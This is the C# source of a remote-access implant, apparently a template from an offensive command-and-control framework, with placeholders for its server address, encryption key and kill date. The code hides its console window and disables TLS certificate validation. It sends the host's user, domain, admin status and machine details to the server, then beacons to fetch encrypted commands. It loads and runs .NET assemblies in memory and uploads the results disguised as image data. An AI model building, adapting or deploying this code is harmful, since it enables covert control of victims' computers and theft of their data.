using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Globalization;

public class Program
{
	[DllImport("kernel32.dll")]
	static extern IntPtr GetConsoleWindow();
	[DllImport("user32.dll")]
	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
	[DllImport("shell32.dll")]
    static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
	public const int SW_HIDE = 0;
	public const int SW_SHOW = 5;
    public static string taskId;
    private static string pKey;

	public static void Sharp()
	{
		var handle = GetConsoleWindow();
		ShowWindow(handle, SW_HIDE);
		AUnTrCrts();
		try { primer(); } catch {
			var mre = new System.Threading.ManualResetEvent(false);
			mre.WaitOne(300000);
			try { primer(); } catch {
				mre.WaitOne(600000);
				try { primer(); } catch { }
			}
		}
	}
	public static void Main()
	{
		Sharp();
	}
    static string[] CLArgs(string cl)
    {
        int argc;
        var argv = CommandLineToArgvW(cl, out argc);
        if (argv == IntPtr.Zero)
            throw new System.ComponentModel.Win32Exception();
        try
        {
            var args = new string[argc];
            for (var i = 0; i < args.Length; i++)
            {
                var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                args[i] = Marshal.PtrToStringUni(p);
            }

            return args;
        }
        finally
        {
            Marshal.FreeHGlobal(argv);
        }
    }
	static byte[] Combine(byte[] first, byte[] second)
	{
		byte[] ret = new byte[first.Length + second.Length];
		Buffer.BlockCopy(first, 0, ret, 0, first.Length);
		Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
		return ret;
	}
	static System.Net.WebClient GetWebRequest(string cookie)
	{
		var x = new System.Net.WebClient();

		var purl = @"#REPLACEPROXYURL#";
		var puser = @"#REPLACEPROXYUSER#";
		var ppass = @"#REPLACEPROXYPASSWORD#";

		if (!String.IsNullOrEmpty(purl))
		{
			WebProxy proxy = new WebProxy();
			proxy.Address = new Uri(purl);
			proxy.Credentials = new NetworkCredential(puser, ppass);
            if (String.IsNullOrEmpty(puser)) 
			{ 
				proxy.UseDefaultCredentials = true; 
			}
			proxy.BypassProxyOnLocal = false;
			x.Proxy = proxy;
		} else {
			if (null != x.Proxy)
				x.Proxy.Credentials = CredentialCache.DefaultCredentials;
		}

		var df = "#REPLACEDF#";
		if (!String.IsNullOrEmpty(df))
			x.Headers.Add("Host", df);

		x.Headers.Add("User-Agent", "#REPLACEUSERAGENT#");
		x.Headers.Add("Referer", "#REPLACEREFERER#");

		if (null != cookie)
			x.Headers.Add(System.Net.HttpRequestHeader.Cookie, String.Format("SessionID={0}", cookie));

		return x;
	}
	static string Decryption(string key, string enc)
	{
		var b = System.Convert.FromBase64String(enc);
		var IV = new Byte[16];
		Array.Copy(b, IV, 16);
		try
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV));
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0'))); 

		}
		catch
		{
			var a = CreateCam(key, System.Convert.ToBase64String(IV), false);
			var u = a.CreateDecryptor().TransformFinalBlock(b, 16, b.Length - 16);
            return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(u).Trim('\0'))); 
		}
		finally
		{
			Array.Clear(b, 0, b.Length);
			Array.Clear(IV, 0, 16);
		}
	}
	static bool ihInteg()
	{
		System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
		System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
		return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
	}	
	static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
	{
		byte[] byEnc = null;
		if (unByte != null)
			byEnc = unByte;
		else
			byEnc = System.Text.Encoding.UTF8.GetBytes(un);
		
		if (comp)
			byEnc = Compress(byEnc);

		try
		{
			var a = CreateCam(key, null);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
		catch
		{
			var a = CreateCam(key, null, false);
			var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
			return System.Convert.ToBase64String(Combine(a.IV, f));
		}
	}
	static System.Security.Cryptography.SymmetricAlgorithm CreateCam(string key, string IV, bool rij = true)
	{
		System.Security.Cryptography.SymmetricAlgorithm a = null;
		if (rij)
			a = new System.Security.Cryptography.RijndaelManaged();
		else
			a = new System.Security.Cryptography.AesCryptoServiceProvider();

		a.Mode = System.Security.Cryptography.CipherMode.CBC;
		a.Padding = System.Security.Cryptography.PaddingMode.Zeros;
		a.BlockSize = 128;
		a.KeySize = 256;
  
		if (null != IV)
			a.IV = System.Convert.FromBase64String(IV);
		else
			a.GenerateIV();

		if (null != key)
			a.Key = System.Convert.FromBase64String(key);

		return a;
	}
	static void AUnTrCrts()
	{
		try
		{
			System.Net.ServicePointManager.ServerCertificateValidationCallback = (z, y, x, w) => { return true; };
		}
		catch { }
	}
	static void primer()
	{
		if (DateTime.ParseExact("#REPLACEKILLDATE#", "dd/MM/yyyy", CultureInfo.InvariantCulture) > DateTime.Now)
		{
			var u = "";
			try
			{
				u = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
			} catch {
				u = System.Environment.UserName;
			}
			if (ihInteg())
			  u += "*";
			var dn = System.Environment.UserDomainName;
			var cn = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
			int pid = Process.GetCurrentProcess().Id;
			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
			var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
			String key = "#REPLACEKEY#", baseURL = "#REPLACEBASEURL#", s = "#REPLACESTARTURL#";

			var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
			var x = Decryption(key, primer);

			var re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
			var m = re.Match(x);
			string RandomURI = m.Groups[1].ToString();

			re = new Regex("URLS10484390243(.*)34209348401SLRU");
			m = re.Match(x);
			string URLS = m.Groups[1].ToString();

			re = new Regex("KILLDATE1665(.*)5661ETADLLIK");
			m = re.Match(x);
			var KillDate = m.Groups[1].ToString();

			re = new Regex("SLEEP98001(.*)10089PEELS");
			m = re.Match(x);
			var Sleep = m.Groups[1].ToString();

			re = new Regex("JITTER2025(.*)5202RETTIJ");
			m = re.Match(x);
			var Jitter = m.Groups[1].ToString();

			re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
			m = re.Match(x);
			var NewKey = m.Groups[1].ToString();

			re = new Regex("IMGS19459394(.*)49395491SGMI");
			m = re.Match(x);
			var IMGs = m.Groups[1].ToString();

			ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs, Jitter);
		}
	}
	static byte[] Compress(byte[] raw)
	{
	    using (MemoryStream memory = new MemoryStream())
	    {
	      using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
	      {
	        gzip.Write(raw, 0, raw.Length);
	      }
	      return memory.ToArray();
	    }
	}	
	static Type LoadS(string assemblyqNme)
	{
		return Type.GetType(assemblyqNme, (name) =>
		   {
			   return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
		   }, null, true);
	}
    static string rAsm(string c)
	{
		var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
		int i = 0;
		string sOut = "";
		string sMethod = "", sta = "", qNme = "", name = "";
		foreach (var a in splitargs)
		{
			if (i == 1)
				qNme = a;
			if (i == 2)
				name = a;
			if (c.ToLower().StartsWith("run-exe")) {
				if (i > 2)
					sta = sta + " " + a;
			} else {
				if (i == 3)
					sMethod = a;
				else if (i > 3)
					sta = sta + " " + a;
			}
			i++;
		}
		string[] l = CLArgs(sta);
		var asArgs = l.Skip(1).ToArray();
		foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
		{
			if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
			{
				var lTyp = LoadS(qNme + ", " + Ass.FullName);
				try
				{
					if (c.ToLower().StartsWith("run-exe")) {
                        object output = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs });
                        if(output != null){
                            sOut = output.ToString();
                        }
					}
					else if(c.ToLower().StartsWith("run-dll")) 
					{
						try
						{
                            object output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs);
                            if(output != null){
                                sOut = output.ToString();
                            }
						}
						catch
						{
                            object output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null);
                            if(output != null){
                                sOut = output.ToString();
                            }
					    }
                    }
                    else {
                        sOut = "[-] Error running assembly, unrecognised command: " + c;
                    }
				}
				catch(NullReferenceException) {}
				catch(Exception e)
                {
                        sOut = "[-] Error running assembly: " + e.Message;
                        sOut += e.StackTrace;
                }
				break;
			}
		}
		return sOut;
	}
	static int Parse_Beacon_Time(string time, string unit)
	{
		int beacontime = Int32.Parse(time);
		switch (unit)
		{
			case "h":
				beacontime *= 3600;
				break;
			case "m":
				beacontime *= 60;
				break;
		}
		return beacontime;
	}	
	internal static class UrlGen
	{
		static List<String> _stringnewURLS = new List<String>();
		static String _randomURI;
		static String _baseUrl;
		static Random _rnd = new Random();
		static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
		internal static void Init(string stringURLS, String RandomURI, String baseUrl)
		{
			_stringnewURLS = _re.Matches(stringURLS.Replace(",", "").Replace(" ", "")).Cast<Match>().Select(m => m.Value).Where(m => !string.IsNullOrEmpty(m)).ToList();
			_randomURI = RandomURI;
			_baseUrl = baseUrl;
		}
	
		internal static String GenerateUrl()
		{
			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
			return String.Format("{0}/{1}{2}/?{3}", _baseUrl, URL, Guid.NewGuid(), _randomURI);
		}
	}	
	internal static class ImgGen
	{
		static Random _rnd = new Random();
		static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", RegexOptions.Compiled);
		static List<String> _newImgs = new List<String>();
		
		internal static void Init(String stringIMGS)
		{
			var stringnewIMGS = _re.Matches(stringIMGS.Replace(",", "")).Cast<Match>().Select(m => m.Value);
			stringnewIMGS = stringnewIMGS.Where(m => !string.IsNullOrEmpty(m));
      _newImgs = stringnewIMGS.ToList();
		}

		static string RandomString(int length)
		{
			const string chars = "...................@..........................Tyscf";
			return new string(Enumerable.Repeat(chars, length).Select(s => s[_rnd.Next(s.Length)]).ToArray());
		}
		
		internal static byte[] GetImgData(byte[] cmdoutput)
		{
			Int32 maxByteslen = 1500, maxDatalen = cmdoutput.Length + maxByteslen;
			var randimg = _newImgs[(new Random()).Next(0, _newImgs.Count)];
			var imgBytes = System.Convert.FromBase64String(randimg);
			var BytePadding = System.Text.Encoding.UTF8.GetBytes((RandomString(maxByteslen - imgBytes.Length)));
			var ImageBytesFull = new byte[maxDatalen];
	
			System.Array.Copy(imgBytes, 0, ImageBytesFull, 0, imgBytes.Length);
			System.Array.Copy(BytePadding, 0, ImageBytesFull, imgBytes.Length, BytePadding.Length);
			System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
			return ImageBytesFull;
		}
	}

    public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null) {
		if (string.IsNullOrEmpty(key))
		{
		    key = pKey;
		}
		var eTaskId = Encryption(key, taskId);
		var dcoutput = "";
		if (encByte != null)
			dcoutput = Encryption(key, null, true, encByte);
		else
			dcoutput = Encryption(key, cmd, true);
		var doutputBytes = System.Convert.FromBase64String(dcoutput);
		var dsendBytes = ImgGen.GetImgData(doutputBytes);

		var attempts = 0;
    	while (attempts < 5) {
    		attempts += 1;
			try 
			{
				GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
				attempts = 5;
			} catch	{}
		}
	}

    static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
	{
		UrlGen.Init(stringURLS, RandomURI, baseURL);
		ImgGen.Init(stringIMGS);
		pKey = Key;
		int beacontime = 5;
		var ibcnRgx = new Regex(@"(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
		var imch = ibcnRgx.Match(Sleep);
		if (imch.Success)
		{
			beacontime = Parse_Beacon_Time(imch.Groups["t"].Value, imch.Groups["u"].Value);
		}
		var strOutput = new StringWriter();
		Console.SetOut(strOutput);
		var exitvt = new ManualResetEvent(false);
		var output = new StringBuilder();
		double dJitter = 0;
		if(!Double.TryParse(Jitter, NumberStyles.Any, CultureInfo.InvariantCulture, out dJitter))
        {
            dJitter = 0.2;
        }
		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - dJitter)), (int)(beacontime * 1000 * (1F + dJitter))))))
		{
			if (DateTime.ParseExact(KillDate, "dd/MM/yyyy", CultureInfo.InvariantCulture) < DateTime.Now)
			{
				exitvt.Set();
				continue;
			}
			output.Length = 0;
			try
			{
				String x = "", cmd = null;
				try
				{
					cmd = GetWebRequest(null).DownloadString(UrlGen.GenerateUrl());
					x = Decryption(Key, cmd).Replace("\0", string.Empty);
				}
				catch
				{
					continue;
				}	
				if (x.ToLower().StartsWith("multicmd"))
				{
					var splitcmd = x.Replace("multicmd", "");
					var split = splitcmd.Split(new string[] { "!d-3dion@LD!-d" }, StringSplitOptions.RemoveEmptyEntries);
					foreach (string c in split)
					{
						Program.taskId = c.Substring(0, 5);
						cmd = c.Substring(5, c.Length - 5);
						if (cmd.ToLower().StartsWith("exit"))
						{
							exitvt.Set();
							break;
						}						
						else if (cmd.ToLower().StartsWith("loadmodule"))
						{
							var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
							var assembly = System.Reflection.Assembly.Load(System.Convert.FromBase64String(module));
							Exec(output.ToString(), taskId, Key);
						}						
						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
						{
							output.AppendLine(rAsm(cmd));
						}
						else if (cmd.ToLower().StartsWith("beacon"))
						{
							var bcnRgx = new Regex(@"(?<=(beacon)\s{1,})(?<t>[0-9]{1,9})(?<u>[h,m,s]{0,1})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
							var mch = bcnRgx.Match(c);
							if (mch.Success)
							{
								beacontime = Parse_Beacon_Time(mch.Groups["t"].Value, mch.Groups["u"].Value);
							}
							else 
							{
								output.AppendLine(String.Format(@"[X] Invalid time ""{0}""", c));
							}
							Exec("Beacon set", taskId, Key);
						}
						else 
						{
							var sHot = rAsm($"run-exe Core.Program Core {cmd}");							
						}	
						output.AppendLine(strOutput.ToString());
						var sb = strOutput.GetStringBuilder();
						sb.Remove(0, sb.Length);
						if (output.Length > 2)
							Exec(output.ToString(), taskId, Key);
							output.Length = 0;
					}
				}
			}
			catch (NullReferenceException e) {}
			catch (WebException e) {}
			catch (Exception e)
			{
				Exec(String.Format("Error: {0} {1}", output.ToString(), e), "Error", Key);
			}
		}
	}
}

